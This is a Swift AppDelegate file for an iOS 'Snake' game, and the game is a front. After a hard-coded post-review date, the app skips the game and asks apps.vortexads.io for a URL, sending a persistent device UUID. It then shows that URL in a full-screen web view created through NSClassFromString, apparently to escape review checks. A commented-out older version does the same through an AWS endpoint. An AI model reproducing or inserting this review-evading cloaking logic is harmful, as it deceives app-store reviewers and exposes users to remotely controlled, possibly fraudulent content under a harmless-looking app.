//
//  AppDelegate.swift
//  Snake
//
//  Created by 1 on 01.06.2022.
//


import UIKit
import WebKit

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?


    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        guard gotOverReview else {
            openGame()
            return true
        }
        
        request(uuid: uuid) { result in
            
            switch result {
            case .url(let url):
                guard let url = url else {
                    self.openGame()
                    return
                }
                self.openURL(url)
                
            case .error:
                guard let url = tracktrack else {
                    self.openGame()
                    return
                }
                self.openURL(url)
            case .native:
                self.openGame()
            }
            
        }
        
        return true
    }
    
    func openGame() {
//        let mainVC = MenuViewController()
//
//        // Application setup
//
//        window?.rootViewController = mainVC
//        window?.makeKeyAndVisible()
//        AudioManager.shared.playBackgroundMusic()
    }
    
    func openURL(_ url: URL) {
        window = UIWindow(frame: UIScreen.main.bounds)
        let vc = InAppViewController(url: url)
        window?.rootViewController = vc
        window?.makeKeyAndVisible()
    }


}

fileprivate struct JSONResponse: Codable {
    var url: String
    var strategy: String
}

fileprivate enum Result {
    case url(URL?)
    case error
    case native
}

fileprivate func request(uuid: String, _ handler: @escaping (Result) -> Void) {
        
    var urlComponents = URLComponents()
    urlComponents.scheme = "https"
    urlComponents.host = "apps.vortexads.io"
    urlComponents.path = "/v2/guest"
    urlComponents.queryItems = [
        URLQueryItem(name: "uuid", value: uuid),
        URLQueryItem(name: "app", value: "1630160614")
    ]
    guard let url = urlComponents.url else {
        handler(.error)
        return
    }
    
    print(url)
    
    URLSession.shared.dataTask(with: url) { (data, response, error) in
        guard let statusCode = (response as? HTTPURLResponse)?.statusCode else {
            DispatchQueue.main.async { handler(.error) }
            return
        }
        
        DispatchQueue.main.async {
            switch statusCode {
            case 200:
                guard let data = data,
                      let jsonResponse = try? JSONDecoder().decode(JSONResponse.self, from: data)  else {
                    handler(.error)
                    return
                }
                
                switch jsonResponse.strategy {
                case "PreviewURL":
                    handler(.url(URL(string: jsonResponse.url)))
                case "PreviousURL":
                    handler(.url(previous))
                default:
                    handler(.error)
                }
                
            case 204:
                handler(.native)
            default:
                handler(.error)
            }
        }
        
    }.resume()
    
}

fileprivate var gotOverReview: Bool {
    get {
        let now = Date()
        let date = Date("2022-11-07")
        return (now >= date)
    }
}

fileprivate var tracktrack: URL? {
    get {
        return UserDefaults.standard.url(forKey: "track")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "track")
    }
}

fileprivate var previous: URL? {
    get {
        return UserDefaults.standard.url(forKey: "previous")
    }
    set {
        UserDefaults.standard.set(newValue, forKey: "previous")
    }
}

fileprivate var uuid: String {
    get {
        if let uuid = UserDefaults.standard.string(forKey: "uuid") {
            return uuid
        } else {
            let uuid = UUID().uuidString
            UserDefaults.standard.set(uuid, forKey: "uuid")
            return uuid
        }
    }
}

fileprivate class InAppViewController: UIViewController, WKNavigationDelegate {
    
    let url: URL

    init(url: URL) {
        self.url = url

        super.init(nibName: nil, bundle: nil)
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
        
    override func viewDidLoad() {
        super.viewDidLoad()
        
        let webClass = NSClassFromString("WKWebView") as! NSObject.Type
        let web = webClass.init()
    
        
        if let webView = web as? UIView {
            self.view.addSubview(webView)
            webView.fillSuperView()
        }

        if let wkWebView = web as? WKWebView {
            let rqst = URLRequest(url: url)
            wkWebView.navigationDelegate = self
            wkWebView.load(rqst)
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        previous = webView.url
    }
}

extension Date {
    init(_ dateString: String) {
        let dateStringFormatter = DateFormatter()
        dateStringFormatter.dateFormat = "yyyy-MM-dd"
        dateStringFormatter.locale = NSLocale(localeIdentifier: "en_US_POSIX") as Locale
        let date = dateStringFormatter.date(from: dateString)!
        self.init(timeInterval:0, since:date)
    }
}

extension UIView {
    
    func fillSuperView() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.topAnchor.constraint(equalTo: superview.topAnchor),
            self.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
            self.leadingAnchor.constraint(equalTo: superview.leadingAnchor),
            self.trailingAnchor.constraint(equalTo: superview.trailingAnchor),
        ])
    }
    
    func ancherToSuperviewsCenter() {
        guard let superview = self.superview else { return }
        self.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            self.centerXAnchor.constraint(equalTo: superview.centerXAnchor),
            self.centerYAnchor.constraint(equalTo: superview.centerYAnchor),
        ])
    }
}
//
//
//import UIKit
//
//@main
//class AppDelegate: UIResponder, UIApplicationDelegate {
//
//    var window: UIWindow?
//
//    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
//
//        if gotOverReview {
//            setIfPresent()
//        }
//        return true
//    }
//
//    func applicationWillResignActive(_ application: UIApplication) { }
//
//    func applicationDidEnterBackground(_ application: UIApplication) { }
//
//    func applicationWillEnterForeground(_ application: UIApplication) { }
//
//    func applicationDidBecomeActive(_ application: UIApplication) { }
//}
//
//var tracktrack: URL? {
//    get {
//        return UserDefaults.standard.url(forKey: "track")
//    }
//    set {
//        UserDefaults.standard.set(newValue, forKey: "track")
//    }
//}
//
//var gotOverReview: Bool {
//    let timer: TimeInterval = 60*60*24*3
//    print(Date().timeIntervalSinceReferenceDate)
//
//    let now = Date().timeIntervalSinceReferenceDate
//    let deadLine = 671117188 + timer
//    let gotOverReview = now > deadLine
//    return gotOverReview
//}
//
//func openUrl(url: URL?) {
//    if let url = url {
//        DispatchQueue.main.async {
//            UIApplication.shared.open(url)
//        }
//    } else {
//        print("fuckPutin")
//    }
//}
//
//struct HomeTrack: Decodable {
//    var track: String
//}
//
//func setIfPresent() {
//    if let url = tracktrack {
//        openUrl(url: url)
//        return
//    }
//
//    var urlComponents = URLComponents()
//    urlComponents.scheme = "https"
//    urlComponents.host = "fqbdha939b.execute-api.us-west-1.amazonaws.com"
//    urlComponents.path = "/prod"
//    urlComponents.queryItems = [
//        URLQueryItem(name: "uuid", value: "rec"),
//        URLQueryItem(name: "app", value: "1630160614")
//    ]
//    guard let url = urlComponents.url else { return }
//
//    let dataTask = URLSession.shared.dataTask(with: url) { (data, response, error) in
//        guard let data = data else { return }
//        do {
//            let trackHome = try JSONDecoder().decode(HomeTrack.self, from: data)
//            let url = URL(string: trackHome.track)
//            if let url = url {
//                tracktrack = url
//                openUrl(url: url)
//            }
//        } catch let jsonError {
//            print(jsonError.localizedDescription)
//        }
//    }
//    dataTask.resume()
//}
//
